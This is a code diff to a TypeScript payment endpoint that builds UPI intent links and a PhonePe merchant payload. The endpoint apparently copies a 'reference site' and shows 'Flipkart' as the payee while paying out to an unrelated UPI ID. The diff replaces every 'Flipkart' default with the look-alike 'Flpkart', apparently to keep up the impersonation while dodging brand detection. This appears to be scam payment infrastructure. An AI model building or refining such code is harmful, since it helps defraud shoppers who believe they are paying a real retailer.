@@ -32,7 +32,7 @@ export async function POST(request: Request) {
     const defaultUpi = (globalSettings.upi || upiSettings.upi || globalSettings.merchantUpiId || process.env.UPI_ID || process.env.MERCHANT_UPI_ID || '03400C123L@mairtel').trim();
     const phonepeUpi = (globalSettings.upi2 || upiSettings.upi2 || defaultUpi).trim();
     const paytmUpi = (globalSettings.upi3 || upiSettings.upi3 || defaultUpi).trim();
-    const storeName = (globalSettings.payeeName || process.env.STORE_NAME || 'Flipkart').trim();
+    const storeName = (globalSettings.payeeName || process.env.STORE_NAME || 'Flpkart').trim();
 
     // 2. Determine order and transaction ID to use
     let orderIdToUse = orderId;
@@ -104,8 +104,8 @@ export async function POST(request: Request) {
     // 4. Generate UPI URLs matching reference site
     const orderAmt = Number(amount).toFixed(2);
     const randomOrderId = Math.floor(Math.random() * 9000000000) + 1000000000;
-    const orderNote = `Paying To Flipkart ORDER${randomOrderId}`;
-    const encName = encodeURIComponent(storeName || 'Flipkart');
+    const orderNote = `Paying To Flpkart ORDER${randomOrderId}`;
+    const encName = encodeURIComponent(storeName || 'Flpkart');
     const encNote = encodeURIComponent(orderNote);
 
     // 1. PhonePe Intent (Exact base64 EXTERNAL_MERCHANT COLLECT payload from reference site)
@@ -121,7 +121,7 @@ export async function POST(request: Request) {
       },
       contact: {
         type: "EXTERNAL_MERCHANT",
-        name: storeName || "Flipkart",
+        name: storeName || "Flpkart",
         vpa: phonepeUpi || defaultUpi
       }
     };
@@ -149,7 +149,7 @@ export async function POST(request: Request) {
       paytmIntent,
       phonepeIntent,
       gpayIntent,
-      merchantName: storeName || 'Flipkart',
+      merchantName: storeName || 'Flpkart',
       upiId: defaultUpi,
       phonepeUpi,
       paytmUpi
